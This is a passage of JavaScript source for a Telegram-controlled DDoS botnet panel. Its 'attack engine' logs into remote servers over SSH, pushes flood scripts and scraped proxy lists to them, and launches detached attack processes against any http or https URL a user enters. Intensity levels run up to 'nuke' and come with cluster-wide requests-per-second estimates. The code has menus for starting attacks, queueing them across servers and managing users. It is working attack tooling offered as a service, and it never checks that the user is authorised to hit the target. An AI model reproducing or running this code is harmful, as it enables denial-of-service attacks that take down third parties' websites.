  for (const aux of AUX_FILES) {
    const local = path.join(CONFIG.SCRIPT_DIR, aux);
    if (!fs.existsSync(local)) continue;
    try {
      const r = await ensureAuxOnRemote(conn, serverId, aux);
      out.aux.push({ name: aux, uploaded: r.uploaded });
      if (aux === CONFIG.PROXY_FILE) out.proxy = true;
    } catch {}
  }
  try {
    const env = remoteEnvCache.get(serverId) || await collectRemoteEnv(serverId, conn);
    if (env?.nodePath) { await ensureDepsOnRemote(conn, serverId, env); out.deps = true; }
  } catch {}
  return out;
}

function getEligibleServers(level) {
  const preset = INTENSITY[level];
  const online = store.servers.get().filter(s => s.status === 'online');
  if (!preset || !preset.minCores) return online;
  return online.filter(s => {
    const env = remoteEnvCache.get(s.id) || healthCache.get(s.id)?.env;
    if (!env || !env.cores) return false;
    return env.cores >= preset.minCores;
  });
}
function getServerCores(id) {
  const env = remoteEnvCache.get(id) || healthCache.get(id)?.env;
  return env?.cores || null;
}

/* ══════════════════════════════════════════════════════════════════════════
   ATTACK ENGINE
   ══════════════════════════════════════════════════════════════════════════ */

const ATTACKS = new EventEmitter();
const newSessionId = () => 'sess_' + crypto.randomBytes(4).toString('hex');
const newBatchId = () => 'batch_' + crypto.randomBytes(4).toString('hex');

function persistSession(session) {
  const s = { ...session };
  delete s.child; delete s.timer; delete s.logStream;
  store.sessions.mutate(all => { all[session.id] = s; });
}

async function launchRemoteOnce(user, method, parsed, serverId, batchId, onProgress) {
  const server = getServer(serverId);
  if (!server) throw new Error('Server not found: ' + serverId);
  const conn = await getServerConn(serverId);
  const env = await ensureRemoteReady(serverId, conn, onProgress);

  const neededAux = scanMethodAux(method.file);
  for (const aux of neededAux) {
    if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, aux))) throw new Error(`${method.name} needs ${aux} locally but it's missing`);
  }

  await ensureMethodOnRemote(conn, serverId, method.file);
  for (const aux of AUX_FILES) { try { await ensureAuxOnRemote(conn, serverId, aux); } catch {} }
  try { await ensureDepsOnRemote(conn, serverId, env, onProgress); }
  catch (e) { if (onProgress) onProgress('⚠️ deps: ' + e.message.slice(0, 80)); }

  const id = newSessionId();
  const logFile = `/tmp/.atk_${id}.log`;
  const quotedArgs = parsed.args.map(shellQuote).join(' ');
  const nodeBin = env.nodePath;

  const launchScript = [
    'set +e',
    `cd ${shellQuote(CONFIG.REMOTE_DIR)} || { echo "LAUNCH_ERR:cd_failed"; exit 1; }`,
    `rm -f ${shellQuote(logFile)}`,
    `setsid ${shellQuote(nodeBin)} ${shellQuote(method.file)} ${quotedArgs} < /dev/null > ${shellQuote(logFile)} 2>&1 &`,
    `PID=$!`, `disown $PID 2>/dev/null || true`, `echo "LAUNCHED:$PID"`,
  ].join('\n');

  const r = await safeRemoteExec(conn, launchScript.split('\n'), CONFIG.ATTACK_TIMEOUT);
  const out = r.out || '';
  const launchedMatch = out.match(/LAUNCHED:(\d+)/);
  let remotePid = launchedMatch ? parseInt(launchedMatch[1], 10) : 0;

  if (!remotePid) {
    const pg = await sshExec(conn, `pgrep -f ${shellQuote(nodeBin + ' ' + method.file)} | head -1`, 8000);
    remotePid = parseInt((pg.out || '').trim().replace(/[^0-9]/g, ''), 10);
  }

  if (!remotePid || isNaN(remotePid)) {
    const tail = await sshExec(conn, `tail -30 ${shellQuote(logFile)} 2>/dev/null || echo "no log"`, 6000);
    const snippet = (tail.out || r.err || '').trim().slice(0, 300) || 'no pid returned';
    throw new Error(`${server.name}: launch failed — ${snippet}`);
  }

  await new Promise(r => setTimeout(r, CONFIG.REMOTE_STABILIZE_MS));

  const alive = await sshExec(conn, `kill -0 ${remotePid} 2>/dev/null && echo ALIVE || echo DEAD`, 5000);
  if (!alive.out.includes('ALIVE')) {
    const tail = await sshExec(conn, `tail -30 ${shellQuote(logFile)} 2>/dev/null || echo "no log"`, 6000);
    const snippet = (tail.out || '').trim().slice(0, 400) || 'no log content';
    throw new Error(`${server.name}: died immediately — ${snippet}`);
  }

  const session = {
    id, batchId, owner: user.telegramId, method: method.id, methodName: method.name,
    target: parsed.target, duration: Number(parsed.duration) || 0,
    startedAt: Date.now(), status: 'running', where: 'remote',
    serverId, serverName: server.name, remotePid, logFile, logs: '', nodeBin,
    perNodeThreads: parsed.threads, perNodeRate: parsed.rate,
  };
  session.timer = setTimeout(() => stopSession(id, 'duration_expired'), session.duration * 1000);
  session.timer.unref();
  persistSession(session);
  return session;
}

async function launchRemote(user, method, parsed, serverId, batchId, onProgress) {
  let lastErr;
  for (let attempt = 0; attempt <= CONFIG.REMOTE_RETRY; attempt++) {
    try { return await launchRemoteOnce(user, method, parsed, serverId, batchId, onProgress); }
    catch (e) {
      lastErr = e;
      remoteEnvCache.delete(serverId);
      remoteDepsCache.delete(serverId);
      if (attempt < CONFIG.REMOTE_RETRY) await new Promise(r => setTimeout(r, 500 * (attempt + 1)));
    }
  }
  throw lastErr;
}

function stopSession(id, reason = 'manual') {
  const live = store.sessions.get()[id];
  if (!live || live.status !== 'running') return false;
  if (live.where === 'remote' && live.remotePid) {
    (async () => {
      try {
        const conn = await getServerConn(live.serverId);
        await sshExec(conn, `kill -9 ${live.remotePid} 2>/dev/null; pkill -9 -P ${live.remotePid} 2>/dev/null || true`, CONFIG.REMOTE_KILL_GRACE_MS);
      } catch {}
    })();
  }
  store.sessions.mutate(all => {
    if (all[id]) { all[id].status = 'stopped'; all[id].stoppedAt = Date.now(); all[id].stopReason = reason; }
  });
  audit('attack_stopped', live.owner, { id, reason });
  ATTACKS.emit('stopped', id);
  if (live.batchId) {
    const still = Object.values(store.sessions.get()).filter(s => s.batchId === live.batchId && s.status === 'running');
    if (still.length === 0) ATTACKS.emit('batch_done', live.batchId);
  }
  return true;
}

function stopAllSessions(ownerFilter = null) {
  let killed = 0;
  for (const [id, s] of Object.entries(store.sessions.get())) {
    if (s.status !== 'running') continue;
    if (ownerFilter && s.owner !== ownerFilter) continue;
    if (stopSession(id, 'killall')) killed++;
  }
  return killed;
}

function stopBatch(batchId, ownerFilter = null) {
  let killed = 0;
  for (const [id, s] of Object.entries(store.sessions.get())) {
    if (s.status !== 'running' || s.batchId !== batchId) continue;
    if (ownerFilter && s.owner !== ownerFilter) continue;
    if (stopSession(id, 'batch_stop')) killed++;
  }
  return killed;
}

async function tailSessionLog(id, n = 30) {
  const live = store.sessions.get()[id];
  if (!live) return '(session not found)';
  try {
    const conn = await getServerConn(live.serverId);
    const r = await sshExec(conn, `tail -${n} ${shellQuote(live.logFile)} 2>/dev/null || echo "(no log)"`, 8000);
    return (r.out || '(no log)').trim();
  } catch (e) { return `(error: ${e.message})`; }
}

class AttackQueue {
  constructor(perServerConcurrency) {
    this.perServer = perServerConcurrency;
    this.serverCounts = new Map();
    this.queue = [];
    this.running = 0;
    this.maxRunning = 100;
  }
  size() { return this.queue.length + this.running; }
  stats() { return { pending: this.queue.length, running: this.running, max: this.maxRunning }; }
  push(task) {
    if (this.queue.length >= CONFIG.MAX_QUEUE) {
      if (task.onError) task.onError(new Error('queue full'));
      return;
    }
    this.queue.push(task); this._pump();
  }
  _pump() {
    while (this.queue.length && this.running < this.maxRunning) {
      const idx = this.queue.findIndex(t => this._canRun(t));
      if (idx === -1) break;
      const [task] = this.queue.splice(idx, 1);
      this._run(task);
    }
  }
  _canRun(task) {
    if (task.kind !== 'remote') return true;
    return (this.serverCounts.get(task.serverId) || 0) < this.perServer;
  }
  async _run(task) {
    this.running++;
    if (task.kind === 'remote') this.serverCounts.set(task.serverId, (this.serverCounts.get(task.serverId) || 0) + 1);
    try { await task.fn(); }
    catch (e) { if (task.onError) task.onError(e); }
    finally {
      this.running--;
      if (task.kind === 'remote') this.serverCounts.set(task.serverId, (this.serverCounts.get(task.serverId) || 1) - 1);
      this._pump();
    }
  }
}
const attackQueue = new AttackQueue(CONFIG.MAX_CONCURRENT_PER_SERVER);

function validateTarget(raw) {
  let url;
  try { url = new URL(raw); } catch { throw new Error('URL invalid'); }
  if (url.protocol !== 'https:' && url.protocol !== 'http:') throw new Error('must be http:// or https://');
  return { url: raw, host: normalizeHost(url.hostname) };
}

/* ══════════════════════════════════════════════════════════════════════════
   BOT CORE — v22.0 webhook fix
   ══════════════════════════════════════════════════════════════════════════ */

const bot = new TelegramBot(CONFIG.BOT_TOKEN, {
  polling: false,
});

let pollingRestarts = 0;
let pollingActive = false;

async function startPollingSafe() {
  if (pollingActive) return;
  try {
    await bot.deleteWebHook({ drop_pending_updates: false });
    console.log('[polling] webhook cleared');
  } catch (e) { console.warn('[polling] deleteWebhook:', e.message); }

  try {
    await bot.startPolling({ restart: true });
    pollingActive = true;
    pollingRestarts = 0;
    console.log('[polling] started');
  } catch (e) {
    console.error('[polling] start failed:', e.message);
    restartPolling(e.message);
  }
}

function restartPolling(reason) {
  if (pollingRestarts >= CONFIG.MAX_POLLING_RESTARTS) {
    console.error('[polling] max restarts — exiting');
    process.exit(1);
  }
  pollingRestarts++;
  const backoff = Math.min(60000, 2000 * Math.pow(2, Math.min(pollingRestarts, 5)));
  console.warn(`[polling] "${reason}" — restart #${pollingRestarts} in ${backoff}ms`);
  pollingActive = false;
  setTimeout(async () => {
    try { await bot.stopPolling({ cancel: true }); } catch {}
    await startPollingSafe();
  }, backoff);
}

bot.on('polling_error', err => {
  const msg = String(err?.message || err);
  if (msg.includes('409')) {
    console.warn('[polling] 409 conflict — another instance running with this token');
    return;
  }
  if (msg.includes('ECONNRESET') || msg.includes('ETIMEDOUT')) return;
  console.error('[polling_error]', msg);
  restartPolling(msg);
});

let lastUpdateAt = Date.now();
bot.on('message', () => { lastUpdateAt = Date.now(); });
bot.on('callback_query', () => { lastUpdateAt = Date.now(); });

setInterval(() => {
  const stale = Date.now() - lastUpdateAt;
  if (stale > CONFIG.HEARTBEAT_STALE_MS && pollingActive) {
    console.warn(`[heartbeat] stale ${Math.floor(stale / 1000)}s — restart`);
    lastUpdateAt = Date.now();
    restartPolling('stale-heartbeat');
  }
}, CONFIG.HEARTBEAT_CHECK_MS).unref();

setInterval(() => {
  const now = Date.now();
  for (const [k, v] of pendingInput) if (v.expires && v.expires < now) pendingInput.delete(k);
  for (const [k, v] of buckets) if (now - v.lastRefill > 600000) buckets.delete(k);
  for (const [k, v] of healthCache) if (now - v.at > 300000) healthCache.delete(k);
  for (const [k, v] of remoteEnvCache) if (now - v.at > CONFIG.REMOTE_ENV_TTL * 2) remoteEnvCache.delete(k);
  for (const [k, v] of remoteDepsCache) if (now - v.at > CONFIG.REMOTE_ENV_TTL * 2) remoteDepsCache.delete(k);
  for (const [k, v] of methodRateMap) {
    const recent = v.filter(t => now - t < CONFIG.METHOD_RATE_WINDOW_MS);
    if (recent.length === 0) methodRateMap.delete(k); else methodRateMap.set(k, recent);
  }
  for (const [k, v] of Object.entries(store.cooldowns.get())) {
    if (v.until < now) store.cooldowns.mutate(c => { delete c[k]; });
  }
}, 60000).unref();

setInterval(() => {
  const now = Date.now();
  store.sessions.mutate(all => {
    for (const [id, s] of Object.entries(all)) {
      if (s.status === 'running') continue;
      if (s.status === 'stale') { if (now - (s.staleAt || s.startedAt) > 3600000) delete all[id]; }
      else { const endAt = s.stoppedAt || (s.startedAt + (s.duration || 0) * 1000); if (now - endAt > CONFIG.SESSION_GC_MS) delete all[id]; }
    }
  });
}, 30000).unref();

if (CONFIG.AUTO_REFRESH_PROXIES) {
  setInterval(async () => {
    try {
      const n = await scrapeProxies();
      console.log(`[auto-refresh] proxies +${n} · total ${readProxies().length}`);
      const ua = await scrapeUAs();
      console.log(`[auto-refresh] uas +${ua} · total ${readUAs().length}`);
    } catch (e) { console.error('[auto-refresh]', e.message); }
  }, CONFIG.AUTO_REFRESH_INTERVAL_MS).unref();
}

/* ══════════════════════════════════════════════════════════════════════════
   REPLY HELPERS
   ══════════════════════════════════════════════════════════════════════════ */

async function reply(msg, text, opts = {}) {
  try { return await bot.sendMessage(msg.chat.id, text, { parse_mode: 'HTML', disable_web_page_preview: true, ...opts }); }
  catch { try { return await bot.sendMessage(msg.chat.id, text); } catch {} }
}
async function edit(chatId, messageId, text, opts = {}) {
  try { await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', disable_web_page_preview: true, ...opts }); } catch {}
}
async function answerCB(id, text, alert = false) {
  try { await bot.answerCallbackQuery(id, { text, show_alert: alert }); } catch {}
}

const btn = (text, cb, style = 'primary') => ({ text, callback_data: cb, style });

function paginate(items, page, perPage = 8) {
  const total = Math.ceil(items.length / perPage);
  const p = Math.max(1, Math.min(page, total || 1));
  return { slice: items.slice((p - 1) * perPage, p * perPage), page: p, total, hasNext: p < total, hasPrev: p > 1 };
}

function hardwareBadge(env) {
  if (!env) return '';
  const c = env.cores ? `${env.cores}c` : '?c';
  const m = env.memMB ? formatGB(env.memMB) : '?G';
  return `${c} · ${m}`;
}
function hardwareIcon(env) {
  if (!env || !env.cores) return '';
  if (env.cores >= 24) return ' 🔥🔥';
  if (env.cores >= 16) return ' 🔥';
  if (env.cores >= 8) return ' ⚡';
  return '';
}
function depsBadge(serverId) {
  const d = remoteDepsCache.get(serverId);
  if (!d) return '';
  return d.ok ? ' · 📦' : ' · ⚠️deps';
}
function estimateNodeRps(cores) { if (!cores) return 0; return Math.min(cores * 200, 14400); }

/* ══════════════════════════════════════════════════════════════════════════
   INTENSITY PICKER
   ══════════════════════════════════════════════════════════════════════════ */

function intensityKeyboard(userId, onlineServers, method = null) {
  const admin = isAdmin(userId);
  const kb = [];
  for (const [key, val] of Object.entries(INTENSITY)) {
    if (val.adminOnly && !admin) continue;
    const eligible = getEligibleServers(key).length;
    const est = estimateRpsFor(key, null, method);
    const adminTag = val.adminOnly ? ' 🔒' : '';
    const coreTag = val.minCores ? ` · ${val.minCores}c+` : '';
    const disabled = val.minCores && eligible === 0;

    let label;
    if (disabled) label = `${val.emoji} ${val.label}${adminTag}${coreTag} · ⚠️ 0 eligible`;
    else if (key === 'auto') label = `${val.emoji} ${val.label}${adminTag} · ~${formatNum(est?.aggregateRps || 0)}`;
    else if (method?.parseIntensity) {
      const int = method.parseIntensity(key, 4);
      const nodeInfo = val.minCores ? `${eligible}/${onlineServers}` : `${onlineServers}`;
      label = `${val.emoji} ${val.label}${adminTag}${coreTag} · ${int.conn}c×${int.streams}s · ${nodeInfo}n · ~${formatNum(est?.aggregateRps || 0)}`;
    } else {
      const nodeInfo = val.minCores ? `${eligible}/${onlineServers}` : `${onlineServers}`;
      label = `${val.emoji} ${val.label}${adminTag}${coreTag} · ${val.threads}T×${val.rate}R · ${nodeInfo}n · ~${formatNum(est?.aggregateRps || 0)}`;
    }

    kb.push([{
      text: label,
      callback_data: disabled ? 'noop' : `int_${key}`,
      style: disabled ? 'danger' : (key === 'nuke' || key === 'extreme') ? 'danger' : (key === 'heavy' || key === 'auto') ? 'success' : 'primary',
    }]);
  }
  kb.push([btn('❌ Cancel', 'int_cancel', 'danger')]);
  return { inline_keyboard: kb };
}

async function showIntensityMenu(chatId, userId, methodId, target, duration) {
  const method = getMethod(methodId);
  if (!method) return;
  pendingInput.set(userId, { action: 'awaiting_intensity', data: { methodId, target, duration }, expires: Date.now() + 300000 });
  const user = getUser(userId) || { telegramId: userId };
  const onlineServers = store.servers.get().filter(s => s.status === 'online').length;
  const maxSrv = user.limits?.maxServers || 0;
  const auxNeeded = scanMethodAux(method.file);
  const auxLine = auxNeeded.length ? `\n⚠️ needs: <code>${auxNeeded.join(', ')}</code>` : '';
  const maxLine = maxSrv > 0 ? `\n🖥 Max ${maxSrv} server(s)/attack` : `\n🖥 Unlimited servers`;
  const specialHint = method.parseIntensity ? `\n<i>Uses --conn × --streams</i>` : '';
  const cooldown = getMethodCooldown(method.id);
  const cooldownLine = cooldown > 0 ? `\n⏳ Method cooldown: ${cooldown}s` : '';
  const lines = [
    `${method.emoji} <b>Attack Setup</b>`, ``,
    `📦 <b>${esc(method.name)}</b>`,
    `🎯 <code>${esc(target)}</code>`,
    `⏱ ${duration}s${auxLine}${maxLine}${cooldownLine}`, ``,
    `<b>Choose intensity:</b>`,
    `<i>🐝 Swarm = many small · 🤖 Auto = per-core · 🔴/☢️ need 16+ cores</i>${specialHint}`,
  ].join('\n');
  await bot.sendMessage(chatId, lines, { parse_mode: 'HTML', disable_web_page_preview: true, reply_markup: intensityKeyboard(userId, onlineServers, method) });
}

/* ══════════════════════════════════════════════════════════════════════════
   MENUS
   ══════════════════════════════════════════════════════════════════════════ */

function mainMenu(userId) {
  const kb = [
    [btn('💥 New Attack', 'menu_attack', 'danger'), btn('📊 Status', 'menu_status', 'success')],
    [btn('📦 Methods', 'menu_methods', 'primary'), btn('⭐ Favorites', 'menu_favs', 'success')],
    [btn('📡 Servers', 'menu_servers', 'primary'), btn('🕹 Sessions', 'menu_sessions', 'primary')],
    [btn('📜 History', 'menu_history', 'primary'), btn('📈 Top', 'menu_top', 'primary')],
  ];
  if (isAdmin(userId)) kb.push([btn('👑 Admin Panel', 'menu_admin', 'danger')]);
  return { inline_keyboard: kb };
}

function methodMenu(methodId) {
  const m = getMethod(methodId);
  const isFav = m && getFavorites(0).includes?.(methodId);
  return { inline_keyboard: [
    [btn('💥 Start Attack', `quick_${methodId}`, 'danger')],
    [btn('⭐ Toggle Favorite', `fav_${methodId}`, 'success')],
    [btn('⬅️ Back', 'menu_main', 'primary')],
  ]};
}

const backMenu = (label = '⬅️ Back', cb = 'menu_main') => ({ inline_keyboard: [[btn(label, cb, 'primary')]] });

function adminMenu(viewerId) {
  const kb = [
    [btn('👥 Users', 'adm_users', 'primary'), btn('🖥 Servers', 'adm_servers', 'primary')],
    [btn('📦 Methods', 'adm_methods', 'primary'), btn('🎯 Presets', 'adm_presets', 'success')],
    [btn('🌐 Proxies', 'adm_proxies', 'primary'), btn('🎭 User-Agents', 'adm_ua', 'primary')],
    [btn('📎 Aux Files', 'adm_aux', 'primary'), btn('🚫 Blacklist', 'adm_blacklist', 'danger')],
    [btn('🤖 Bot Control', 'adm_botcontrol', 'primary'), btn('📊 Stats', 'adm_stats', 'success')],
    [btn('🔬 Scan Deps', 'adm_scandeps', 'primary'), btn('📜 Audit', 'adm_audit', 'primary')],
    [btn('🔥 Eligible', 'adm_eligible', 'primary'), btn('📢 Broadcast', 'adm_broadcast', 'primary')],
    [btn('🔄 Refresh', 'adm_refresh', 'primary'), btn('💀 Kill All', 'adm_killall', 'danger')],
  ];
  if (isOwner(viewerId)) kb.push([btn('👑 Manage Admins', 'adm_manage', 'success')]);
  kb.push([btn('⬅️ Back', 'menu_main', 'primary')]);
  return { inline_keyboard: kb };
}

/* ══════════════════════════════════════════════════════════════════════════
   VIEWS
   ══════════════════════════════════════════════════════════════════════════ */

async function showMainMenu(chatId, editMsgId, userId) {
  const s = serverStats();
  const user = getUser(userId) || {};
  const online = botIsOnline();
  const methods = availableMethods().filter(m => m.enabled);
  const uaCount = readUAs().length;
  const proxyCount = readProxies().length;
  const maxSrv = user.limits?.maxServers;
  const maxSrvTxt = maxSrv > 0 ? `${maxSrv}` : '∞';
  const qStats = attackQueue.stats();
  const txt = [
    `⚫ <b>${BRAND}</b> <i>${VERSION}</i> ⚫`, ``,
    `🏛 Status: <b>${online ? '🟢 ONLINE' : '🔴 MAINTENANCE'}</b>`,
    `👤 Role: <b>${roleLabel(user)}</b> ${roleBadge(user)}`,
    `📡 Servers: <b>${s.online}/${s.total}</b> online · ⚔️ <b>${s.attacking}</b> attacking`,
    `🎯 Queue: <b>${qStats.pending}</b> pending · <b>${qStats.running}</b> running`,
    `🖥 Your limit: <b>${maxSrvTxt}</b> server(s)/attack`,
    `📦 Methods: <b>${methods.length}</b> active`,
    `🌐 Proxies: <b>${formatNum(proxyCount)}</b> · 🎭 UAs: <b>${formatNum(uaCount)}</b>`,
    user.lastMethod ? `\n🔁 Last: <code>${esc(user.lastMethod)}</code>${user.lastTarget ? ` → <code>${esc(String(user.lastTarget).slice(0, 40))}</code>` : ''}` : '',
    ``, `<i>/attack for direct · /help for commands · /ping for latency</i>`,
  ].filter(Boolean).join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: mainMenu(userId) });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: mainMenu(userId) });
}

async function showMethodDetail(chatId, editMsgId, methodId, viewerId) {
  const m = getMethod(methodId);
  if (!m) return;
  const deps = scanMethodDeps(m.file);
  const aux = scanMethodAux(m.file);
  const hist = store.history.get().filter(h => h.method === methodId);
  const fileExists = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
  const isFav = getFavorites(viewerId).includes(methodId);
  const txt = [
    `${m.emoji || '📦'} <b>${m.name}</b> ${fileExists ? '' : '❌'}${isFav ? ' ⭐' : ''}`,
    m.enabled ? '' : '<i>🔴 DISABLED</i>', ``,
    `📝 <i>${esc(m.desc)}</i>`, ``,
    `<b>File:</b> <code>${esc(m.file)}</code>`,
    `<b>Deps:</b> ${deps.length ? deps.map(d => `<code>${esc(depDisplay(d))}</code>`).join(', ') : '<i>none</i>'}`,
    aux.length ? `<b>Needs aux:</b> ${aux.map(a => `<code>${esc(a)}</code>`).join(', ')}` : '',
    m.minCooldown ? `<b>Cooldown:</b> ${m.minCooldown}s` : '',
    m.parseIntensity ? `<b>Intensity:</b> per-method presets (conn×streams)` : '',
    ``, `<b>Usage:</b>`, `<code>${esc(m.example)}</code>`, ``,
    `📈 Launches: <b>${m.stats?.launches || 0}</b>`,
    hist.length ? `<b>History:</b> ${hist.length}` : '',
  ].filter(Boolean).join('\n');
  const kb = [
    [btn('💥 Start Attack', `quick_${methodId}`, 'danger')],
    [btn(isFav ? '⭐ Remove Favorite' : '⭐ Add Favorite', `fav_${methodId}`, 'success')],
    [btn('⬅️ Back', 'menu_methods', 'primary')],
  ];
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showServers(chatId, editMsgId, userId) {
  const s = serverStats();
  const list = store.servers.get();
  const groups = listGroups();
  const busy = busyServerIds();
  const txt = [`📡 <b>Servers</b>`, ``, `🟢 ${s.online} · 🔴 ${s.offline} · ⚔️ ${s.attacking}`, ``];
  if (groups.length) txt.push(`🏷 Groups: ${groups.map(g => `<code>${esc(g)}</code>`).join(', ')}`, ``);
  if (isAdmin(userId) && list.length) {
    let totalCores = 0, totalRps = 0;
    for (const srv of list.slice(0, 25)) {
      const icon = srv.status === 'online' ? '🟢' : srv.status === 'offline' ? '🔴' : '⚪';
      const n = serverLoad(srv.id);
      const busyTag = busy.has(srv.id) ? ' ⚔️busy' : '';
      const grp = srv.group ? ` [${esc(srv.group)}]` : '';
      const env = remoteEnvCache.get(srv.id) || healthCache.get(srv.id)?.env;
      const cores = env?.cores || 0;
      const rps = estimateNodeRps(cores);
      if (srv.status === 'online') { totalCores += cores; totalRps += rps; }
      const hw = env ? ` · ${hardwareBadge(env)}${hardwareIcon(env)} · ~${formatNum(rps)}` : '';
      const db = depsBadge(srv.id);
      txt.push(`${icon} <b>${esc(srv.name)}</b>${grp}${hw}${db}${busyTag}${n ? ` ×${n}` : ''}`);
    }
    if (list.length > 25) txt.push(`\n… +${list.length - 25} more`);
    txt.push('', `<b>Cluster:</b> ${totalCores} cores · ~${formatNum(totalRps)} RPS`, `<i>🔥=16+ · 🔥🔥=24+ · ⚡=8+ · 📦=deps ok · ⚔️=busy</i>`);
  }
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: backMenu() });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: backMenu() });
}

async function showStatus(chatId, editMsgId, userId) {
  const sessions = Object.values(store.sessions.get()).filter(s => s.owner === userId && s.status === 'running');
  const s = serverStats();
  const batches = new Map();
  for (const sess of sessions) {
    if (!batches.has(sess.batchId)) batches.set(sess.batchId, []);
    batches.get(sess.batchId).push(sess);
  }
  const txt = [`📊 <b>Live Status</b>`, ``, `📡 ${s.online}/${s.total} online · ⚔️ ${s.attacking}`];
  if (batches.size === 0) txt.push(`\n📭 <i>No active attacks.</i>`);
  else {
    txt.push('');
    for (const [batchId, list] of batches) {
      const sample = list[0];
      const elapsed = Math.floor((Date.now() - sample.startedAt) / 1000);
      const remain = Math.max(0, sample.duration - elapsed);
      const pct = sample.duration > 0 ? Math.floor((elapsed / sample.duration) * 100) : 0;
      const perNode = sample.perNodeThreads ? ` · ${sample.perNodeThreads}×${sample.perNodeRate}` : '';
      txt.push(`<b>⚔️ ${esc(sample.methodName)}</b>${perNode}`);
      txt.push(`  🎯 ${esc(String(sample.target).slice(0, 50))}`);
      txt.push(`  ${progressBar(pct)} ${elapsed}s / ${sample.duration}s · ${remain}s left`);
      txt.push(`  🖥 ${list.length} server(s) · <code>${batchId}</code>`, '');
    }
  }
  const kb = batches.size
    ? { inline_keyboard: [[btn('🛑 Stop All', 'stop_all_mine', 'danger')], [btn('⬅️ Back', 'menu_main', 'primary')]] }
    : backMenu();
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: kb });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: kb });
}

async function showSessions(chatId, editMsgId, userId) {
  const mine = Object.values(store.sessions.get()).filter(s => s.owner === userId && s.status === 'running');
  if (!mine.length) {
    const txt = `🕹 <b>Sessions</b>\n\n📭 <i>No active sessions.</i>`;
    if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: backMenu() });
    else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: backMenu() });
    return;
  }
  const batches = new Map();
  for (const sess of mine) {
    if (!batches.has(sess.batchId)) batches.set(sess.batchId, []);
    batches.get(sess.batchId).push(sess);
  }
  const kb = [];
  for (const [batchId, list] of batches) {
    const sample = list[0];
    kb.push([btn(`🛑 Stop Batch · ${sample.methodName} (${list.length}srv)`, `batch_stop_${batchId}`, 'danger')]);
    for (const sess of list) kb.push([btn(`  🛑 ${esc(sess.serverName || sess.serverId)}`, `sess_stop_${sess.id}`, 'danger')]);
  }
  kb.push([btn('⬅️ Back', 'menu_main', 'primary')]);
  const txt = [`🕹 <b>Sessions (${mine.length})</b>`, '', `<i>Tap batch to stop all, or server to stop one</i>`].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showHistory(chatId, editMsgId, userId, page = 1) {
  const all = [...store.history.get()].reverse();
  const { slice, page: p, total, hasNext, hasPrev } = paginate(all, page, 10);
  const txt = [`📜 <b>History</b> (${all.length})`, ''];
  if (!slice.length) txt.push('📭 Empty');
  else {
    for (const h of slice) {
      const when = new Date(h.at).toISOString().slice(5, 16).replace('T', ' ');
      const intLabel = h.intensity ? ` · ${h.intensity}` : '';
      txt.push(`<code>${when}</code> · <b>${esc(h.method)}</b>${intLabel}`);
      txt.push(`  🎯 ${esc(String(h.target).slice(0, 40))} · ⏱${h.duration}s · ${h.ok}/${h.total}`);
    }
  }
  const nav = [];
  if (hasPrev) nav.push(btn('« Prev', `hist_p${p - 1}`, 'primary'));
  nav.push(btn(`${p}/${total || 1}`, 'noop', 'primary'));
  if (hasNext) nav.push(btn('Next »', `hist_p${p + 1}`, 'primary'));
  const kb = [];
  if (nav.length) kb.push(nav);
  kb.push([btn('⬅️ Back', 'menu_main', 'primary')]);
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showMethods(chatId, editMsgId, userId) {
  const user = getUser(userId) || { telegramId: userId };
  const admin = isAdmin(userId);
  const list = admin ? allMethods() : visibleMethodsFor(user);
  const txt = [`📦 <b>Methods</b> (${list.length})`, ''];
  const kb = [];
  for (const m of list) {
    const ok = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
    const deps = scanMethodDeps(m.file);
    const aux = scanMethodAux(m.file);
    let icon = '✅';
    if (!m.enabled) icon = '🔴';
    else if (!ok) icon = '❌';
    txt.push(`${m.emoji || '📦'} <b>${m.name}</b> ${icon}${m.builtin ? '' : ' 🔧'}${m.parseIntensity ? ' ⚙️' : ''}`);
    txt.push(`  <i>${esc(m.desc)}</i>`);
    txt.push(`  📦 ${deps.length} dep(s)${aux.length ? ` · 📎 ${aux.length} aux` : ''}`);
    kb.push([btn(`${m.emoji || '📦'} ${m.name}`, `method_${m.id}`, m.enabled && ok ? 'primary' : 'danger')]);
  }
  kb.push([btn('⬅️ Back', 'menu_main', 'primary')]);
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showFavorites(chatId, editMsgId, userId) {
  const favs = getFavorites(userId);
  if (!favs.length) {
    const txt = `⭐ <b>Favorites</b>\n\n📭 <i>No favorites yet.\nOpen any method and tap ⭐ Add Favorite.</i>`;
    if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: backMenu() });
    else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: backMenu() });
    return;
  }
  const kb = favs.map(id => {
    const m = getMethod(id);
    return [btn(`${m.emoji} ${m.name}`, `quick_${id}`, 'success')];
  });
  kb.push([btn('⬅️ Back', 'menu_main', 'primary')]);
  const txt = `⭐ <b>Favorites (${favs.length})</b>\n\n<i>Tap to quick-launch.</i>`;
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
